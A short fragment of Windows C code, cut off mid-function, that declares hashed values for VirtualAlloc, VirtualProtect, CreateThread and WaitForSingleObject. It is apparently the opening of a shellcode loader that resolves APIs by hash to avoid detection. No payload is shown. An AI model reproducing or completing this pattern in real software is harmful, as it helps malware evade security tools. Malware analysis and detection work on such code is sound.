...
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0xDD85EBEE;
    uint32_t h_VirtualProtect = 0x5CAB9F1C;
    uint32_t h_CreateThread = 0xBE01C0D6;
    uint32_t h_WaitForSingleObject = 0xAF39324B;
